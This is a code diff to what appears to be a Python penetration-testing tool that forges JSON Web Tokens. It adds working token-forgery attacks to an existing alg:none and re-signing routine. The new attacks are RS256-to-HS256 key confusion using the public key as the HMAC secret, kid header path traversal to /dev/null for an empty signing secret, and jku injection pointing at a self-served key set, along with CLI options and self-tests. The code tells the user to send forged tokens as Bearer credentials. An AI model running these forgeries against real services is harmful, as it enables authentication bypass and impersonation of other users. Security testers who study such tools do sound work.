@@ -36,7 +36,8 @@ def _b64d(text: str) -> bytes:
 
 
 def forge(token: str, claims: dict | None = None, secret: str = "",
-          alg: str = "") -> dict:
+          alg: str = "", pubkey: bytes = b"", kid: str = "",
+          kid_secret: str = "", jku: str = "") -> dict:
     parts = token.strip().strip('"\'').split(".")
     if len(parts) not in (2, 3):
         return {"error": "not a JWT (expected 2 or 3 segments)"}
@@ -56,6 +57,12 @@ def forge(token: str, claims: dict | None = None, secret: str = "",
     p64 = _b64e(json.dumps(payload, separators=(",", ":")).encode())
     out["alg_none"] = f"{h_none}.{p64}."
 
+    def _sign(hdr, key, use_alg="hs256"):
+        h64 = _b64e(json.dumps(hdr, separators=(",", ":")).encode())
+        sig = _b64e(hmac.new(key, f"{h64}.{p64}".encode(),
+                             _ALGS[use_alg]).digest())
+        return f"{h64}.{p64}.{sig}"
+
     if secret:
         use_alg = (alg or src_alg).lower()
         if use_alg not in _ALGS:
@@ -63,13 +70,32 @@ def forge(token: str, claims: dict | None = None, secret: str = "",
                                    "HS* re-signing is supported — try "
                                    "alg_none or a different --alg")
         else:
-            h = dict(header, alg=use_alg.upper())
-            h64 = _b64e(json.dumps(h, separators=(",", ":")).encode())
-            sig = _b64e(hmac.new(secret.encode(),
-                                 f"{h64}.{p64}".encode(),
-                                 _ALGS[use_alg]).digest())
-            out["resigned"] = f"{h64}.{p64}.{sig}"
+            out["resigned"] = _sign(dict(header, alg=use_alg.upper()),
+                                    secret.encode(), use_alg)
             out["resigned_alg"] = use_alg.upper()
+
+    if pubkey:
+        # RS->HS confusion: a server that feeds the RSA *public* key to
+        # the HMAC verifier signs tokens anyone can mint — the key is public
+        out["confused"] = _sign(dict(header, alg="HS256"), pubkey)
+        out["confused_note"] = ("original alg looks RS* — signed HS256 with "
+                                "the PUBLIC key bytes as the HMAC secret")
+
+    if kid or jku:
+        h2 = dict(header)
+        if kid:
+            h2["kid"] = kid
+        if jku:
+            h2["jku"] = jku
+        use_alg = (alg or src_alg).lower()
+        if use_alg not in _ALGS:
+            use_alg = "hs256"
+            h2["alg"] = "HS256"
+        out["header_injected"] = _sign(
+            h2, kid_secret.encode() if kid else secret.encode(), use_alg)
+        out["header_injected_note"] = (
+            "kid traversal: sign with the bytes AT the pointed path — "
+            "/dev/null means empty secret; jku: serve your own JWKS")
     out["note"] = ("send 'resigned' or 'alg_none' as the token value "
                    "(Authorization: Bearer <token> or the original carrier); "
                    "a 200 honouring the forged claims is the finding")
@@ -98,6 +124,15 @@ def _selftest() -> int:
     h2 = _b64e(json.dumps({"alg": "RS256"}).encode())
     out2 = forge(f"{h2}.{p}.x", secret="k")
     ok &= "resign_error" in out2 and "alg_none" in out2
+    # RS->HS confusion signs with the public key as HMAC secret
+    out3 = forge(f"{h2}.{p}.x", pubkey=b"PUBKEYBYTES")
+    ch, _cp, cs = out3["confused"].split(".")
+    ok &= hmac.compare_digest(
+        cs, _b64e(hmac.new(b"PUBKEYBYTES", f"{ch}.{_cp}".encode(),
+                           hashlib.sha256).digest()))
+    # kid traversal signs with the pointed-file secret
+    out4 = forge(f"{h2}.{p}.x", kid="../../../../dev/null", kid_secret="")
+    ok &= "dev/null" in _b64d(out4["header_injected"].split(".")[0]).decode()
     ok &= "error" in forge("not-a-token")
     print(json.dumps({"selftest": "pass" if ok else "fail"}))
     return 0 if ok else 1
@@ -110,6 +145,13 @@ def main() -> int:
     p.add_argument("--secret", default="", help="signing secret for HS* re-sign")
     p.add_argument("--alg", default="", choices=["", "hs256", "hs384", "hs512"],
                    help="override the sign alg (default: keep the token's)")
+    p.add_argument("--pubkey", default="",
+                   help="RSA public key file for RS->HS confusion")
+    p.add_argument("--kid", default="",
+                   help="kid header value (e.g. ../../../../dev/null)")
+    p.add_argument("--kid-secret", default="",
+                   help="bytes at the pointed kid path (empty for /dev/null)")
+    p.add_argument("--jku", default="", help="jku URL serving your own JWKS")
     p.add_argument("--selftest", action="store_true")
     args = p.parse_args()
     if args.selftest:
@@ -123,8 +165,17 @@ def main() -> int:
     except ValueError as exc:
         print(json.dumps({"error": f"--claims invalid: {exc}"}))
         return 2
+    pubkey = b""
+    if args.pubkey:
+        try:
+            pubkey = open(args.pubkey, "rb").read()
+        except OSError as exc:
+            print(json.dumps({"error": f"--pubkey unreadable: {exc}"}))
+            return 2
     print(json.dumps(forge(args.token, claims=claims, secret=args.secret,
-                           alg=args.alg), indent=2))
+                           alg=args.alg, pubkey=pubkey, kid=args.kid,
+                           kid_secret=args.kid_secret, jku=args.jku),
+                     indent=2))
     return 0
 
 
